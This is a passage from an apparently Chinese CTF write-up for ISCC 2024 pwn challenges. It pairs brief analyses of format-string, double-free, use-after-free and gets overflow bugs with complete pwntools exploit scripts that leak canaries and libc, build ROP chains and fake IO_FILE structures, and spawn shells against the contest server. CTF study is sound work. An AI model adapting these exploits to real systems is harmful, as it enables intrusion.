class="hljs-number">1</span>)))<br><br>fake_io_addr = heap_base + <span class="hljs-number">0x290</span><br>fake_IO_FILE = p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span> + p64(<span class="hljs-number">1</span>) + p64(<span class="hljs-number">2</span>)<br>fake_IO_FILE += p64(fake_io_addr + <span class="hljs-number">0x440</span> + <span class="hljs-number">0x10</span>)<br>fake_IO_FILE += p64(setcontext)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x58</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x78</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(heap_base + <span class="hljs-number">0x1000</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0x90</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(fake_io_addr + <span class="hljs-number">0x30</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xb0</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">1</span>)<br>fake_IO_FILE = fake_IO_FILE.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>)<br>fake_IO_FILE += p64(libc_base + <span class="hljs-number">0x2160c0</span> + <span class="hljs-number">0x30</span>)<br>fake_IO_FILE += p64(<span class="hljs-number">0</span>) * <span class="hljs-number">6</span> + p64(fake_io_addr + <span class="hljs-number">0x40</span>)<br><br>modify_chunk(<span class="hljs-number">2</span>, fake_IO_FILE)<br>create_chunk(<span class="hljs-number">0x90</span>, <span class="hljs-string">b&#x27;a&#x27;</span>)<br>create_chunk(<span class="hljs-number">0x90</span>, p64(heap_base + <span class="hljs-number">0x290</span>))<br><br>rop_chain = p64(prdi_ret) + p64(heap_base + <span class="hljs-number">0x6c0</span>)<br>rop_chain += p64(prsi_ret) + p64(<span class="hljs-number">0</span>)<br>rop_chain += p64(open_addr)<br>rop_chain += p64(prdi_ret) + p64(<span class="hljs-number">3</span>)<br>rop_chain += p64(prdx_r12_ret) + p64(<span class="hljs-number">0x50</span>) * <span class="hljs-number">2</span><br>rop_chain += p64(prsi_ret) + p64(heap_base + <span class="hljs-number">0x2000</span>)<br>rop_chain += p64(read_addr)<br>rop_chain += p64(prdi_ret) + p64(<span class="hljs-number">1</span>)<br>rop_chain += p64(prdx_r12_ret) + p64(<span class="hljs-number">0x50</span>) * <span class="hljs-number">2</span><br>rop_chain += p64(prsi_ret) + p64(heap_base + <span class="hljs-number">0x2000</span>)<br>rop_chain += p64(write_addr)<br><br>modify_chunk(<span class="hljs-number">1</span>, <span class="hljs-string">b&#x27;/flag\x00\x00\x00&#x27;</span> * <span class="hljs-number">2</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span> * (<span class="hljs-number">0xa0</span> + <span class="hljs-number">0x10</span>) + p64(heap_base + <span class="hljs-number">0x7c0</span> + <span class="hljs-number">0x10</span>) + p64(prdi_ret + <span class="hljs-number">1</span>))<br>modify_chunk(<span class="hljs-number">0</span>, rop_chain)<br><br>p.recvuntil(<span class="hljs-string">&quot;input your car choice &gt;&gt; \n&quot;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">5</span>))<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h4 id="pwn-Flag"><a href="#pwn-Flag" class="headerlink" title="pwn Flag"></a>pwn Flag</h4><p><img src="../../../../img/archives/2024ISCC05/2ddc1564b577a4c1c069d36ad210ad85.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/2cb1eac41170c462afb83dd410a3ee86.png" srcset="/img/loading.gif" lazyload></p>
<p>IDA 反编译分析</p>
<p>__isoc99_scanf(“%ms”,&amp;format)存在格式化字符串漏洞：</p>
<p><img src="../../../../img/archives/2024ISCC05/d740f35915d7e22829073fc63419746c.png" srcset="/img/loading.gif" lazyload>%ms 格式符会根据用户输入动态分配内存，并将用户输入存储到分配的内存中，函数不会检查分配的内存大小，导致 format 指针指向的内存可能不足以存储用户输入，从而引发堆溢出漏洞。利用格式化字符串漏洞，使用%p 或者%x 等格式符打印栈上的内容，从而泄露 Canary 值。welcome 函数中，由于 format 指针指向的内存可被控制，我们可以覆盖函数返回地址为 back 函数的地址，从而在 welcome 函数返回时跳转到 back 函数。我们可以构造输入数据，覆盖 back 函数的返回地址为 system 函数的地址，并在栈上布置好&#x2F;bin&#x2F;sh 字符串。</p>
<p>构造 exp 得到 flag</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>conn = remote(<span class="hljs-string">&#x27;182.92.237.102&#x27;</span>, <span class="hljs-number">10012</span>)<br>binary = ELF(<span class="hljs-string">&#x27;./attachment-12&#x27;</span>)<br><br>initial_payload = <span class="hljs-string">b&#x27;a%19$p&#x27;</span><br>conn.sendline(initial_payload)<br>conn.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>canary_value = <span class="hljs-built_in">int</span>(conn.recv(<span class="hljs-number">8</span>), <span class="hljs-number">16</span>)<br>success(<span class="hljs-string">&#x27;canary &#x27;</span> + <span class="hljs-built_in">hex</span>(canary_value))<br><br>func_to_leak = <span class="hljs-string">&#x27;read&#x27;</span><br>got_entry = binary.got[func_to_leak]<br>plt_entry = binary.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>return_address = <span class="hljs-number">0x80494E0</span><br><br>exploit_payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">136</span> + p32(canary_value) + p32(<span class="hljs-number">0xdead</span>) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">8</span><br>exploit_payload += p32(plt_entry) + p32(return_address) + p32(got_entry)<br><br>conn.recvuntil(<span class="hljs-string">b&#x27;Input&#x27;</span>)<br>conn.sendline(exploit_payload)<br>leaked_address = u32(conn.recvuntil(<span class="hljs-string">b&#x27;\xf7&#x27;</span>)[-<span class="hljs-number">4</span>:])<br><br>libc_search = LibcSearcher(func_to_leak, leaked_address)<br>base_libc = leaked_address - libc_search.dump(func_to_leak)<br>sys_offset = base_libc + libc_search.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>bin_sh_offset = base_libc + libc_search.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br><br>log.info(<span class="hljs-string">&#x27;libc base &#x27;</span> + <span class="hljs-built_in">hex</span>(base_libc))<br><br>final_payload = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">136</span> + p32(canary_value) + p32(<span class="hljs-number">0xdead</span>) + <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">8</span><br>final_payload += p32(sys_offset) + p32(return_address) + p32(bin_sh_offset)<br><br>conn.recvuntil(<span class="hljs-string">b&#x27;Input&#x27;</span>)<br>conn.sendline(final_payload)<br>conn.interactive()<br></code></pre></td></tr></table></figure>

<h4 id="pwn-heapheap"><a href="#pwn-heapheap" class="headerlink" title="pwn heapheap"></a>pwn heapheap</h4><p><img src="../../../../img/archives/2024ISCC05/aa34bc90fee178af75c20e5e85f259ee.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/dfdce4ecaf8e8ade2044125f2fcffa5f.png" srcset="/img/loading.gif" lazyload> delete 函数中没有检查索引 v0 是否已经被释放，导致可以对同一块内存进行多次释放，进而进行攻击</p>
<p><img src="../../../../img/archives/2024ISCC05/d4302415fe8f5805431aaf1f8d7c4c67.png" srcset="/img/loading.gif" lazyload></p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p=remote(<span class="hljs-string">&#x27;182.92.237.102&#x27;</span>,<span class="hljs-number">11000</span>)<br>elf=ELF(<span class="hljs-string">&#x27;./heapheap&#x27;</span>)<br>libc=ELF(<span class="hljs-string">&#x27;./libc-2.31.so&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">create</span>(<span class="hljs-params">idx,Size</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice&#x27;</span>,<span class="hljs-string">b&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index&#x27;</span>,<span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(idx),<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    p.sendlineafter(<span class="hljs-string">b&#x27;Size&#x27;</span>,<span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(Size),<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice&#x27;</span>,<span class="hljs-string">b&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index&#x27;</span>,<span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>),<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params"><span class="hljs-built_in">id</span>,Content</span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice&#x27;</span>,<span class="hljs-string">b&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index&#x27;</span>,<span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>),<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br>    p.sendafter(<span class="hljs-string">b&#x27;context&#x27;</span>,Content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params"><span class="hljs-built_in">id</span></span>):<br>    p.sendlineafter(<span class="hljs-string">b&#x27;choice&#x27;</span>,<span class="hljs-string">b&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">b&#x27;index&#x27;</span>,<span class="hljs-built_in">bytes</span>(<span class="hljs-built_in">str</span>(<span class="hljs-built_in">id</span>),<span class="hljs-string">&#x27;utf-8&#x27;</span>))<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_fake_io</span>(<span class="hljs-params">fakeIO_add, orw_add</span>):<br>    fake_IO = <span class="hljs-string">b&#x27;&#x27;</span>.ljust(<span class="hljs-number">0x18</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(<span class="hljs-number">1</span>)<br>    fake_IO = fake_IO.ljust(<span class="hljs-number">0x78</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(fakeIO_add)<br>    fake_IO = fake_IO.ljust(<span class="hljs-number">0x90</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(fakeIO_add + <span class="hljs-number">0x40</span>)<br>    fake_IO = fake_IO.ljust(<span class="hljs-number">0xc8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>) + p64(libcbase + <span class="hljs-number">0x1e8f60</span>)<br>    fake_IO += p64(orw_add) + p64(libcbase + <span class="hljs-number">0x0000000000022679</span>) + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">0x30</span><br>    fake_IO += p64(fakeIO_add + <span class="hljs-number">0xe8</span> + <span class="hljs-number">0x40</span> - <span class="hljs-number">0x68</span>) + p64(libcbase + libc.sym[<span class="hljs-string">&#x27;setcontext&#x27;</span>] + <span class="hljs-number">61</span>)<br>    <span class="hljs-keyword">return</span> fake_IO<br><br>create(<span class="hljs-number">0</span>,<span class="hljs-number">0x420</span>)<br>create(<span class="hljs-number">1</span>,<span class="hljs-number">0x410</span>)<br>create(<span class="hljs-number">2</span>,<span class="hljs-number">0x410</span>)<br>create(<span class="hljs-number">3</span>,<span class="hljs-number">0x410</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>libc_add=u64(p.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>libcbase=libc_add-libc.symbols[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]-<span class="hljs-number">96</span>-<span class="hljs-number">0x10</span><br>io_list_all=libcbase+<span class="hljs-number">0x1ed5a0</span><br>create(<span class="hljs-number">4</span>,<span class="hljs-number">0x430</span>)<br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*(<span class="hljs-number">0x10</span>-<span class="hljs-number">1</span>)+<span class="hljs-string">b&#x27;A&#x27;</span>)<br>show(<span class="hljs-number">0</span>)<br>p.recvuntil(<span class="hljs-string">b&#x27;A&#x27;</span>)<br>heap_add=u64(p.recvuntil(<span class="hljs-string">b&#x27;\n&#x27;</span>)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>fd=libcbase+<span class="hljs-number">0x1ecfd0</span><br>payload=p64(fd)*<span class="hljs-number">2</span>+p64(heap_add)+p64(io_list_all-<span class="hljs-number">0x20</span>)<br>edit(<span class="hljs-number">0</span>,payload)<br>free(<span class="hljs-number">2</span>)<br>create(<span class="hljs-number">5</span>,<span class="hljs-number">0x470</span>)<br>free(<span class="hljs-number">5</span>)<br>openadd=libcbase+libc.sym[<span class="hljs-string">&#x27;open&#x27;</span>]<br>readadd=libcbase+libc.sym[<span class="hljs-string">&#x27;read&#x27;</span>]<br>writeadd=libcbase+libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>rdi=libcbase+<span class="hljs-number">0x0000000000023b6a</span><br>rsi=libcbase+<span class="hljs-number">0x000000000002601f</span><br>rdx_r12=libcbase+<span class="hljs-number">0x0000000000119431</span><br>chunk_small=heap_add+<span class="hljs-number">0x850</span><br>fakeIO_add=chunk_small<br>orw_add=fakeIO_add+<span class="hljs-number">0x200</span><br><br>fake_IO = build_fake_io(fakeIO_add, orw_add)<br><br>flag_add=orw_add+<span class="hljs-number">0x100</span>+<span class="hljs-number">0x10</span><br>orw = p64(rdi)+ p64(flag_add) + p64(rsi) + p64(<span class="hljs-number">0</span>)  + p64(openadd)<br>orw += p64(rdi)+ p64(<span class="hljs-number">3</span>)+p64(rsi)+p64(flag_add)+p64(rdx_r12)+p64(<span class="hljs-number">0x50</span>)+p64(<span class="hljs-number">0</span>)+p64(readadd)<br>orw += p64(rdi)+p64(<span class="hljs-number">1</span>)+p64(writeadd)<br>payload=fake_IO<br>payload=payload.ljust(<span class="hljs-number">0x200</span>-<span class="hljs-number">0x10</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+orw<br>payload=payload.ljust(<span class="hljs-number">0x300</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)+<span class="hljs-string">b&#x27;flag\x00&#x27;</span><br>edit(<span class="hljs-number">2</span>,payload)<br>p.sendlineafter(<span class="hljs-string">b&#x27;choice&#x27;</span>,<span class="hljs-string">b&#x27;5&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure>

<h4 id="pwn-ISCC-easy"><a href="#pwn-ISCC-easy" class="headerlink" title="pwn ISCC_easy"></a>pwn ISCC_easy</h4><p><img src="../../../../img/archives/2024ISCC05/c9dc42b68249eebe5ec829ed9aa34850.png" srcset="/img/loading.gif" lazyload> 程序使用 read(0, s,0x20u)函数从标准输入读取最多 0x20(32)个字节到缓冲区 s 中。使用 printf(s)函数将缓冲区 s 的内容打印到屏幕上，而没有使用格式化字符串，这就造成了格式化字符串漏洞。存在一个 if(x &#x3D;&#x3D; 5)的条件判断，如果满足条件，则会调用 welcome()函数，否则会打印 “Okay, excuseme.”。</p>
<p><img src="../../../../img/archives/2024ISCC05/47b7dec97434a49d33fbb71fd4b96df9.png" srcset="/img/loading.gif" lazyload> 可以利用格式化字符串漏洞修改变量 x 的值，构造格式化字符串，利用%n 格式化字符将 printf()函数已打印的字符个数写入目标地址，从而修改 x 的值为 5，使得程序执行 welcome()函数，并进一步控制程序执行流程进行 ret2libc 攻击。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>e = ELF(<span class="hljs-string">&#x27;./ISCC_easy&#x27;</span>)<br>l = ELF(<span class="hljs-string">&#x27;./libc6-i386_2.31-0ubuntu9.14_amd64.so&#x27;</span>)<br>p = remote(<span class="hljs-string">&#x27;182.92.237.102&#x27;</span>, <span class="hljs-number">10013</span>)<br><br>addr = <span class="hljs-number">0x804C030</span><br><br>p.recvuntil(<span class="hljs-string">&quot;fun!&quot;</span>)<br>payload = fmtstr_payload(<span class="hljs-number">4</span>, &#123;addr: <span class="hljs-number">5</span>&#125;) + <span class="hljs-string">b&#x27;%15$p&#x27;</span><br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>libc_start = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">8</span>), <span class="hljs-number">16</span>)<br>base = libc_start - l.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>] - <span class="hljs-number">245</span><br>sys = base + l.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh = base + <span class="hljs-built_in">next</span>(l.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><br>exploit = <span class="hljs-string">b&#x27;a&#x27;</span> * <span class="hljs-number">0x94</span> + p32(sys) * <span class="hljs-number">2</span> + p32(bin_sh)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;Input&#x27;</span>)<br>p.sendline(exploit)<br><br>p.interactive()<br></code></pre></td></tr></table></figure>

<h4 id="pwn-ISCC-U"><a href="#pwn-ISCC-U" class="headerlink" title="pwn ISCC_U"></a>pwn ISCC_U</h4><p><img src="../../../../img/archives/2024ISCC05/78179485988e9499b2e6dbb007a761e7.png" srcset="/img/loading.gif" lazyload> free 函数中存在 UAF 漏洞，通过 UAF 漏洞可以泄露 libc 地址。通过释放和重新分配堆块，控制堆块的内容，可以将其改写为 system 函数的地址。</p>
<p> <img src="../../../../img/archives/2024ISCC05/e7cf278cf0663a9481a4d72b78937999.png" srcset="/img/loading.gif" lazyload> 编写 exp 获取shell</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>p = remote(<span class="hljs-string">&#x27;182.92.237.102&#x27;</span>, <span class="hljs-number">10016</span>)<br>e = ELF(<span class="hljs-string">&#x27;./attachment-39&#x27;</span>)<br>l = ELF(<span class="hljs-string">&#x27;./libc6-i386_2.31-0ubuntu9.14_amd64.so&#x27;</span>)<br><br>r = <span class="hljs-keyword">lambda</span>: p.recv()<br>ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(x)<br>s = <span class="hljs-keyword">lambda</span> x: p.send(x)<br>sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)<br>sh = <span class="hljs-keyword">lambda</span>: p.interactive()<br>pr = <span class="hljs-keyword">lambda</span> n, x: log.info(n + <span class="hljs-string">&#x27;:&#x27;</span> + <span class="hljs-built_in">hex</span>(x))<br>a4 = <span class="hljs-keyword">lambda</span> n: u32(p.recv(n, timeout=<span class="hljs-number">1</span>).ljust(<span class="hljs-number">4</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">do</span>(<span class="hljs-params">size, content</span>):<br>    sa(<span class="hljs-string">b&#x27;choice :&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>    sa(<span class="hljs-string">b&#x27;Note size :&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br>    sa(<span class="hljs-string">b&#x27;Content :&#x27;</span>, content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dl</span>(<span class="hljs-params">index</span>):<br>    sa(<span class="hljs-string">b&#x27;choice :&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>    sa(<span class="hljs-string">b&#x27;Index :&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">index</span>):<br>    sa(<span class="hljs-string">b&#x27;choice :&#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>    sa(<span class="hljs-string">b&#x27;Index :&#x27;</span>, <span class="hljs-built_in">str</span>(index))<br><br>pg = e.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>pp = <span class="hljs-number">0x080492B6</span><br><br>do(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;note1&#x27;</span>)<br>do(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;note2&#x27;</span>)<br>do(<span class="hljs-number">0x10</span>, <span class="hljs-string">b&#x27;note3&#x27;</span>)<br>dl(<span class="hljs-number">2</span>)<br>dl(<span class="hljs-number">1</span>)<br>do(<span class="hljs-number">0x8</span>, p32(pp) + p32(pg))<br><br>show(<span class="hljs-number">2</span>)<br><br>puts = a4(<span class="hljs-number">4</span>)<br>pr(<span class="hljs-string">&quot;puts&quot;</span>, puts)<br>lb = puts - l.sym[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>sys = lb + l.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>pr(<span class="hljs-string">&quot;system&quot;</span>, sys)<br><br>dl(<span class="hljs-number">3</span>)<br>do(<span class="hljs-number">0x8</span>, p32(sys) + <span class="hljs-string">b&#x27;`;sh&#x27;</span>)<br>show(<span class="hljs-number">2</span>)<br><br>sh()<br></code></pre></td></tr></table></figure>

<h4 id="pwn-miao"><a href="#pwn-miao" class="headerlink" title="pwn miao"></a>pwn miao</h4><p><img src="../../../../img/archives/2024ISCC05/be89882642bcabeda87c8e49bcbad89d.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/7c7b1b6bad53a93667c32070a585f908.png" srcset="/img/loading.gif" lazyload> <img src="../../../../img/archives/2024ISCC05/9ac213328d9c7201b45a6bbb08ba1d57.png" srcset="/img/loading.gif" lazyload> miao 和 miaomiaomiao 函数都使用了 gets 函数读取用户输入，而 gets 函数不会检查输入字符串的长度，导致存在缓冲区溢出漏洞。利用 miao 函数中的 gets 漏洞，输入超过 100 字节的数据，覆盖 v1 缓冲区，从而覆盖栈上的 Canary 值。利用 miaomiaomiao 函数中的 gets 漏洞，再次输入超过 100 字节的数据。覆盖函数返回地址为 ret2syscall 的地址。在覆盖返回地址的同时，在栈上构造好执行&#x2F;bin&#x2F;sh 的 shellcode。</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br><br>binary = ELF(<span class="hljs-string">&quot;./attachment-41&quot;</span>)<br>io = remote(<span class="hljs-string">&quot;182.92.237.102&quot;</span>, <span class="hljs-number">10015</span>)<br><br>io.recvuntil(<span class="hljs-string">b&quot;?\n&quot;</span>)<br>io.sendline(<span class="hljs-string">b&quot;%31$p&quot;</span>)<br>io.recvuntil(<span class="hljs-string">b&quot;0x&quot;</span>)<br>canary = <span class="hljs-built_in">int</span>(io.recv(<span class="hljs-number">8</span>), <span class="hljs-number">16</span>)<br><br>constants = &#123;<br>    <span class="hljs-string">&#x27;eax&#x27;</span>: <span class="hljs-number">0x080b8666</span>,<br>    <span class="hljs-string">&#x27;ebx_edx&#x27;</span>: <span class="hljs-number">0x0806f309</span>,<br>    <span class="hljs-string">&#x27;ecx&#x27;</span>: <span class="hljs-number">0x080def3d</span>,<br>    <span class="hljs-string">&#x27;bin_sh&#x27;</span>: <span class="hljs-number">0x80BB7C8</span>,<br>    <span class="hljs-string">&#x27;int_80&#x27;</span>: <span class="hljs-number">0x0806cf83</span><br>&#125;<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">build_payload</span>(<span class="hljs-params">constants, canary</span>):<br>    payload = <span class="hljs-string">b&quot;a&quot;</span> * <span class="hljs-number">0x64</span> + p32(canary)<br>    payload = payload.ljust(<span class="hljs-number">0x74</span>, <span class="hljs-string">b&quot;a&quot;</span>)<br>    payload += p32(constants[<span class="hljs-string">&#x27;eax&#x27;</span>]) + p32(<span 